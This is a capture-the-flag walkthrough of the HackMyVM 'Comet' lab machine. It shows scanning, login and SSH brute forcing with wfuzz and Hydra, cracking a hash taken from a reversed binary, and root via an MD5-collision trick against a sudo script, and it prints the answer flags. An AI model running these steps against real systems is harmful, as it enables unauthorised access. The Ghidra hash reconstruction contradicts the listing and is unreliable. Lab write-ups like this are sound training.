# CTF Penetration Testing

## HackMyVM

### Comet - Machine

#### Machine Description

- Machine name: [Comet](https://hackmyvm.eu/machines/machine.php?vm=Comet)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/comet.png" alt="Comet Machine Logo" width="150"/>

#### Tools Used

- Ghidra
- Gobuster
- Hydra
- IDA
- John the Ripper
- Nmap
- Wfuzz

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:1f:3c:b3:65  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 2566  bytes 1855261 (1.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1677  bytes 216486 (211.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.101  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::b8a4:ba37:17c5:3d73  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:6e:4c:1d  txqueuelen 1000  (Ethernet)
        RX packets 846060  bytes 203584950 (194.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 556876  bytes 70167297 (66.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1020  bytes 113200 (110.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1020  bytes 113200 (110.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.101
192.168.56.113 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.113`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 16:03 EDT
Nmap scan report for 192.168.56.113
Host is up (0.00069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.54 ((Debian)) ←
MAC Address: 08:00:27:20:E3:7D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.57 seconds
```

`curl http://192.168.56.113`:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>CyberArray</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<link href="style.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="js/cufon-yui.js"></script>
<script type="text/javascript" src="js/arial.js"></script>
<script type="text/javascript" src="js/cuf_run.js"></script>
</head>
<body>
<div class="main">

[...]

      </div>
      <div class="col c2">
        <h2><span>Lorem Ipsum</span></h2>
        <ul class="sb_menu">
          <li><a href="#">consequat molestie</a></li>
          <li><a href="#">sem justo</a></li>
          <li><a href="#">semper</a></li>
          <li><a href="#">magna sed purus</a></li>
          <li><a href="#">tincidunt</a></li>
        </ul>
      </div>
      <div class="col c3">
        <h2>Contact</h2>
        <p>Praesent dapibus, neque id cursus faucibus, tortor neque egestas augue.</p>
        <p><a href="#">support@yoursite.com</a></p>
        <p>+1 (123) 444-5677<br />
          +1 (123) 444-5678</p>
        <p>Address: 123 TemplateAccess Rd1</p>
      </div>
      <div class="clr"></div>
    </div>
  </div>
  <div class="footer">
    <div class="footer_resize">
      <p class="lf">Copyright &copy; <a href="#">Domain Name</a>. All Rights Reserved</p>
      <p class="rf">Design by <a target="_blank" href="http://www.rocketwebsitetemplates.com/">RocketWebsiteTemplates</a></p> ←
      <div class="clr"></div>
    </div>
  </div>
</div>
</body>
</html>
```

`gobuster dir -u http://192.168.56.113 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,bak,jpg,txt,zip -b 400,401,404,500 -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.113
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   401,404,500,400
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 7097]
/about.html           (Status: 200) [Size: 7024]
/blog.html            (Status: 200) [Size: 8242]
/login.php            (Status: 200) [Size: 1443] ←
/support.html         (Status: 200) [Size: 6329]
/images               (Status: 301) [Size: 317] [--> http://192.168.56.113/images/]
/contact.html         (Status: 200) [Size: 5886]
/ip.txt               (Status: 200) [Size: 0] ←
/js                   (Status: 301) [Size: 313] [--> http://192.168.56.113/js/]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
```

`curl http://192.168.56.113/login.php`:
```html
<!DOCTYPE html>
<html>
  <head>
    <title>Sign In</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="login.css">
  </head>
  <body>
    <form class="form" autocomplete="off" method="post">
      <div class="control">
        <h1>Sign In</h1>
      </div>
      <div class="control block-cube block-input">
        <input name="username" type="text" placeholder="Username"/> ←
        <div class="bg-top">
          <div class="bg-inner"></div>
        </div>
        <div class="bg-right">
          <div class="bg-inner"></div>
        </div>
        <div class="bg">
          <div class="bg-inner"></div>
        </div>
      </div>
      <div class="control block-cube block-input">
        <input name="password" type="password" placeholder="Password"/> ←
        <div class="bg-top">
          <div class="bg-inner"></div>
        </div>
        <div class="bg-right">
          <div class="bg-inner"></div>
        </div>
        <div class="bg">
          <div class="bg-inner"></div>
        </div>
      </div>
      <button class="btn block-cube block-cube-hover" type="submit"> ←
        <div class="bg-top">
          <div class="bg-inner"></div>
        </div>
        <div class="bg-right">
          <div class="bg-inner"></div>
        </div>
        <div class="bg">
          <div class="bg-inner"></div>
        </div>
        <div class="text">Log In</div>
      </button>
          </form>
  </body>
</html>
```

`curl "http://192.168.56.113/login.php" -d "username=admin&password=test" -v`:
```html
*   Trying 192.168.56.113:80...
* Connected to 192.168.56.113 (192.168.56.113) port 80 ←
> POST /login.php HTTP/1.1 ←
> Host: 192.168.56.113
> User-Agent: curl/8.8.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 28 bytes
< HTTP/1.1 200 OK
< Date: Tue, 17 Sep 2024 09:24:13 GMT
< Server: Apache/2.4.54 (Debian)
< Vary: Accept-Encoding
< Content-Length: 1491
< Content-Type: text/html; charset=UTF-8
< 

<!DOCTYPE html>
<html>
  <head>
    <title>Sign In</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="login.css">
  </head>
  <body>
    <form class="form" autocomplete="off" method="post">
      <div class="control">
        <h1>Sign In</h1>
      </div>
      <div class="control block-cube block-input">
        <input name="username" type="text" placeholder="Username"/>
        <div class="bg-top">
          <div class="bg-inner"></div>
        </div>
        <div class="bg-right">
          <div class="bg-inner"></div>
        </div>
        <div class="bg">
          <div class="bg-inner"></div>
        </div>
      </div>
      <div class="control block-cube block-input">
        <input name="password" type="password" placeholder="Password"/>
        <div class="bg-top">
          <div class="bg-inner"></div>
        </div>
        <div class="bg-right">
          <div class="bg-inner"></div>
        </div>
        <div class="bg">
          <div class="bg-inner"></div>
        </div>
      </div>
      <button class="btn block-cube block-cube-hover" type="submit">
        <div class="bg-top">
          <div class="bg-inner"></div>
        </div>
        <div class="bg-right">
          <div class="bg-inner"></div>
        </div>
        <div class="bg">
          <div class="bg-inner"></div>
        </div>
        <div class="text">Log In</div>
      </button>
            <p>Invalid username or password</p> ←
          </form>
  </body>
</html>
* Connection #0 to host 192.168.56.113 left intact
```

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.113 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username or password" -f -t 4 -w 1 -v`:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-17 05:37:13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking http-post-form://192.168.56.113:80/login.php:username=^USER^&password=^PASS^:F=Invalid username or password ←
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Retrying connection for child 3
[VERBOSE] Retrying connection for child 2
[VERBOSE] Retrying connection for child 0
[VERBOSE] Retrying connection for child 1
[VERBOSE] Retrying connection for child 3
[VERBOSE] Retrying connection for child 2
[VERBOSE] Retrying connection for child 0
[VERBOSE] Retrying connection for child 1
[VERBOSE] Disabled child 3 because of too many errors
[VERBOSE] Disabled child 2 because of too many errors
[VERBOSE] Disabled child 1 because of too many errors
[ERROR] all children were disabled due too many connection errors ←
0 of 1 target completed, 0 valid password found
[INFO] Writing restore file because 2 server scans could not be completed
[ERROR] 1 target was disabled because of too many errors
[ERROR] 1 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-17 05:37:31
```
❌ Failed Step.

`wfuzz -u 'http://192.168.56.113/login.php' -d 'username=admin&password=FUZZ' -z file,/usr/share/wordlists/rockyou.txt --hc 200 -t 100 -c -v`:
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.56.113/login.php
Total requests: 14344392

====================================================================================================================================================
ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload                                     
====================================================================================================================================================

000346731:   0.003s       302 ←      0 L ←      0 W      0 Ch        Apache/2.4.54 (Debian)           ./logFire ←                      "solitario" ←                               
[...]
```

`w3m http://192.168.56.113/logFire`:
```
Index of /logFire
[ICO]  Name            Last modified      Size  Description
-----------------------------------------------------------
[   ]  Parent Directory                        -  
[   ]  firewall.log      2023-02-19 16:35  6.8K
[   ]  firewall.log.1    2023-02-19 16:35  6.8K
[   ]  firewall.log.2    2023-02-19 16:35  6.8K
[   ]  firewall.log.3    2023-02-19 16:35  6.9K
[   ]  firewall.log.4    2023-02-19 16:35  6.8K
[   ]  firewall.log.5    2023-02-19 16:35  6.7K
[   ]  firewall.log.6    2023-02-19 16:35  6.9K
[   ]  firewall.log.7    2023-02-19 16:35  6.9K
[   ]  firewall.log.8    2023-02-19 16:35  6.7K
[   ]  firewall.log.9    2023-02-19 16:35  6.9K
[   ]  firewall.log.10   2023-02-19 16:35  6.8K
[   ]  firewall.log.11   2023-02-19 16:35  6.8K
[   ]  firewall.log.12   2023-02-19 16:35  6.9K
[   ]  firewall.log.13   2023-02-19 16:35  6.9K
[   ]  firewall.log.14   2023-02-19 16:35  6.9K
[   ]  firewall.log.15   2023-02-19 16:35  6.8K
[   ]  firewall.log.16   2023-02-19 16:35  6.8K
[   ]  firewall.log.17   2023-02-19 16:35  6.9K
[   ]  firewall.log.18   2023-02-19 16:35  6.9K
[   ]  firewall.log.19   2023-02-19 16:35  6.9K
[   ]  firewall.log.20   2023-02-19 16:35  6.8K
[   ]  firewall.log.21   2023-02-19 16:35  6.8K
[   ]  firewall.log.22   2023-02-19 16:35  6.8K
[   ]  firewall.log.23   2023-02-19 16:35  6.9K
[   ]  firewall.log.24   2023-02-19 16:35  6.9K
[   ]  firewall.log.25   2023-02-19 16:35  6.9K
[   ]  firewall.log.26   2023-02-19 16:35  6.9K
[   ]  firewall.log.27   2023-02-19 16:35  6.8K
[   ]  firewall.log.28   2023-02-19 16:35  6.8K
[   ]  firewall.log.29   2023-02-19 16:35  6.8K
[   ]  firewall.log.30   2023-02-19 16:35  6.8K
[   ]  firewall_update   2023-02-19 16:35   16K ←
```

`wget http://192.168.56.113/logFire/firewall_update`:
```
--2024-09-17 04:40:20--  http://192.168.56.113/logFire/firewall_update
Connecting to 192.168.56.113:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16248 (16K)
Saving to: ‘firewall_update’

firewall_update         100%[============================>]  15.87K  --.-KB/s    in 0.001s  

2024-09-17 04:40:20 (15.7 MB/s) - ‘firewall_update’ saved [16248/16248] ←
```

`file ./firewall_update`:
```
./firewall_update: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c8b4cde0414ff49d15473b0d47cde256c7931587, for GNU/Linux 3.2.0, not stripped
```

`/opt/idapro-8.4/ida64 ./firewall_update`:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  char s2[80]; // [rsp+0h] [rbp-F0h] BYREF
  char s1[80]; // [rsp+50h] [rbp-A0h] BYREF
  char s[32]; // [rsp+A0h] [rbp-50h] BYREF
  char v8[44]; // [rsp+C0h] [rbp-30h] BYREF
  int i; // [rsp+ECh] [rbp-4h]

  strcpy(s1, "b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1"); ←
  printf("Enter password: ");
  __isoc99_scanf("%s", s);
  v3 = strlen(s);
  SHA256(s, v3, v8);
  for ( i = 0; i <= 31; ++i )
    sprintf(&s2[2 * i], "%02x", (unsigned __int8)v8[i]);
  if ( !strcmp(s1, s2) )
    puts("Firewall successfully updated");
  else
    puts("Incorrect password");
  return 0;
}
```

🔄 Alternative Step.

`ghidra` > `Import File: ./firewall_update`:
```
undefined8 main(void)

{
  int iVar1;
  size_t n;
  char local_f8 [80];
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined local_68;
  uchar local_58 [32];
  byte local_38 [44];
  int local_c;
  
  local_a8 = 0x3862613832373862; ←
  local_a0 = 0x3139333363336131; ←
  local_98 = 0x3933663336663566; ←
  local_90 = 0x3938656532376164; ←
  local_88 = 0x6639613966333466; ←
  local_80 = 0x6663386362393234; ←
  local_78 = 0x3430386638353865; ←
  local_70 = 0x3162326461616538; ←
  local_68 = 0;
  printf("Enter password: ");
  __isoc99_scanf(&DAT_00102015,local_58);
  n = strlen((char *)local_58);
  SHA256(local_58,n,local_38);
  for (local_c = 0; local_c < 0x20; local_c = local_c + 1) {
    sprintf(local_f8 + local_c * 2,"%02x",(ulong)local_38[local_c]);
  }
  iVar1 = strcmp((char *)&local_a8,local_f8);
  if (iVar1 == 0) {
    puts("Firewall successfully updated");
  }
  else {
    puts("Incorrect password");
  }
  return 0;
}
```

1. **Extract the Variables and Their Values**: The variables in the Ghidra output that store parts of the hash are:
    
    - `local_a8 = 0x3862613832373862`
    - `local_a0 = 0x3139333363336131`
    - `local_98 = 0x3933663336663566`
    - `local_90 = 0x3938656532376164`
    - `local_88 = 0x6639613966333466`
    - `local_80 = 0x6630653263323932`
    - `local_78 = 0x3430386638353865`
    - `local_70 = 0x3162326461616538`

2. **Process Each Variable**: For each variable:
    
    - Convert the 64-bit integer value to an 8-byte array in **little-endian** order.
    - Interpret each byte as an ASCII character.
    - Concatenate the characters to form a part of the hash.
    
    Let's process `local_a8` as an example:
    - **Value**: `0x3862613832373862`
    - **Bytes in Little-Endian Order**:
        - Byte 0: `0x62` ('b')
        - Byte 1: `0x38` ('8')
        - Byte 2: `0x37` ('7')
        - Byte 3: `0x32` ('2')
        - Byte 4: `0x38` ('8')
        - Byte 5: `0x61` ('a')
        - Byte 6: `0x62` ('b')
        - Byte 7: `0x38` ('8')
    - **ASCII Characters**: `'b' '8' '7' '2' '8' 'a' 'b' '8'`
    - **Concatenated String**: `"b8728ab8"`
    
    Repeat this process for each variable.
    
3. **Combine the Parts**: After processing all variables, concatenate all the partial strings in the correct order to reconstruct the full hash.
    
4. **Complete Reconstruction**:
    
    Here's the reconstruction for all variables:
    
    - **local_a8**: `"b8728ab8"`
    - **local_a0**: `"1a3c3391"`
    - **local_98**: `"f5f63f39"`
    - **local_90**: `"da72ee89"`
    - **local_88**: `"f43f9a9f"`
    - **local_80**: `"292c2e0f"`
    - **local_78**: `"e858f804"`
    - **local_70**: `"8eaad2b1"`
    
    **Final Hash**: `"b8728ab81a3c3391f5f63f39da72ee89f43f9a9f292c2e0fe858f8048eaad2b1"`
    
7. **Understanding the Code**:

    - In the Ghidra output, the hash is stored across multiple variables, each holding an 8-byte segment of the hash.
    - The hash is stored in **little-endian** format, so bytes are reversed when read from memory.
    - By converting each 64-bit value to bytes and then to characters, you can reconstruct the original hash.

`vim ./recover_hash.py`
```python
variables = [
    0x3862613832373862,
    0x3139333363336131,
    0x3933663336663566,
    0x3938656532376164,
    0x6639613966333466,
    0x6630653263323932,
    0x3430386638353865,
    0x3162326461616538
]

hash_parts = []

for value in variables:
    bytes_le = value.to_bytes(8, byteorder='little')
    chars = ''.join(chr(b) for b in bytes_le)
    hash_parts.append(chars)

full_hash = ''.join(hash_parts)
print(full_hash)
```

`python3 ./recover_hash.py`:
```
b8728ab81a3c3391f5f63f39da72ee89f43f9a9f292c2e0fe858f8048eaad2b1 ←
```

`vim ./hash.txt`:
```
b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1 
```

`john --format=raw-sha256 --wordlist=/usr/share/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt ./hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prettywoman      (?) ←
1g 0:00:00:00 DONE (2024-09-17 03:28) 11.11g/s 1820Kp/s 1820Kc/s 1820KC/s 9931..mikemo
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

`hydra -L /usr/share/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -p 'prettywoman' ssh://192.168.56.113`:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-17 03:33:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking ssh://192.168.56.113:22/
[22][ssh] host: 192.168.56.113   login: joe   password: prettywoman ←
```

`ssh joe@192.168.56.113`:
```
The authenticity of host '192.168.56.113 (192.168.56.113)' can't be established.
ED25519 key fingerprint is SHA256:s1UJuaVeu8UNzbo7FaamRo2EWZrzFXveeiWZyCxeJE0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.113' (ED25519) to the list of known hosts.
joe@192.168.56.113's password: ←
Linux comet.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

![Victim: joe](https://img.shields.io/badge/Victim-joe-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
joe ←
```

`uname -a`:
```
Linux comet.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
```

`ls -alps`:
```
total 32
4 drwxr-xr-x 3 joe  joe  4096 Feb 19  2023 ./
4 drwxr-xr-x 3 root root 4096 Feb 19  2023 ../
0 lrwxrwxrwx 1 root root    9 Feb 25  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 joe  joe   220 Feb 19  2023 .bash_logout
4 -rw-r--r-- 1 joe  joe  3526 Feb 19  2023 .bashrc
4 -rwxr-xr-x 1 root root  366 Feb 19  2023 coll ←
4 drwxr-xr-x 3 joe  joe  4096 Feb 19  2023 .local/
4 -rw-r--r-- 1 joe  joe   807 Feb 19  2023 .profile
4 -rwx------ 1 joe  joe    33 Feb 19  2023 user.txt ←
```

`cat ./user.txt`:
```
cc32dbc17ec3ddf89f9e6d0991c82616 ←
```

`cat ./coll`:
```
#!/bin/bash
exec 2>/dev/null

file1=/home/joe/file1
file2=/home/joe/file2
md5_1=$(md5sum $file1 | awk '{print $1}')
md5_2=$(md5sum $file2 | awk '{print $1}')


if      [[ $(head -n 1 $file1) == "HMV" ]] && 
        [[ $(head -n 1 $file2) == "HMV" ]] && 
        [[ $md5_1 == $md5_2 ]] && 
        [[ $(diff -q $file1 $file2) ]]; then
    chmod +s /bin/bash
    exit 0
else
    exit 1
fi
```

`sudo -l`:
```
Matching Defaults entries for joe on comet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on comet:
    (ALL : ALL) NOPASSWD: /bin/bash /home/joe/coll ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`echo "HMV" | tee -a ./file`:
```
HMV

```

`/home/kali/md5collgen/md5collgen -p ./file -o ./file1 ./file2`:
```
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: './file1' and './file2' ←
Using prefixfile: './file'
Using initial value: af32bdb207bb81c5e0eb88c7b19397fd

Generating first block: .............................
Generating second block: S01................
Running time: 8.119639 s
```

`scp ./file1 joe@192.168.56.113:/home/joe`:
```        
joe@192.168.56.113's password: 
file1                                          100%  192   114.3KB/s   00:00 ←
```

`scp ./file2 joe@192.168.56.113:/home/joe`:
```
joe@192.168.56.113's password: 
file2                                          100%  192    67.5KB/s   00:00 ←    
```

![Victim: joe](https://img.shields.io/badge/Victim-joe-64b5f6?logo=linux&logoColor=white)

`ls -alps`:
```
total 40
4 drwxr-xr-x 3 joe  joe  4096 Sep 17 10:15 ./
4 drwxr-xr-x 3 root root 4096 Feb 19  2023 ../
0 lrwxrwxrwx 1 root root    9 Feb 25  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 joe  joe   220 Feb 19  2023 .bash_logout
4 -rw-r--r-- 1 joe  joe  3526 Feb 19  2023 .bashrc
4 -rwxr-xr-x 1 root root  366 Feb 19  2023 coll
4 -rw-r--r-- 1 joe  joe   192 Sep 17 10:15 file1 ←
4 -rw-r--r-- 1 joe  joe   192 Sep 17 10:15 file2 ←
4 drwxr-xr-x 3 joe  joe  4096 Feb 19  2023 .local/
4 -rw-r--r-- 1 joe  joe   807 Feb 19  2023 .profile
4 -rwx------ 1 joe  joe    33 Feb 19  2023 user.txt
```

`md5sum file1`:
```
f46d6ec08c68cb48fe098307863e85b6  file1 ←
```

`md5sum file2`:
```
f46d6ec08c68cb48fe098307863e85b6  file2 ←
```

`sudo /bin/bash /home/joe/coll`

`ls -alps /bin/bash`:
```
1208 -rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash ←
```

`bash -p`

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`cd /root/`

`ls -alps`:
```
total 24
4 drwx------  3 root root 4096 Feb 21  2023 ./
4 drwxr-xr-x 18 root root 4096 Feb 20  2023 ../
0 lrwxrwxrwx  1 root root    9 Feb  6  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 Feb 19  2023 .local/
4 -rw-r--r--  1 root root  161 Jul  9  2019 .profile
4 -rwx------  1 root root   33 Feb  6  2023 root.txt ←
```

`cat root.txt`:
```
052cf26a6e7e33790391c0d869e2e40c ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
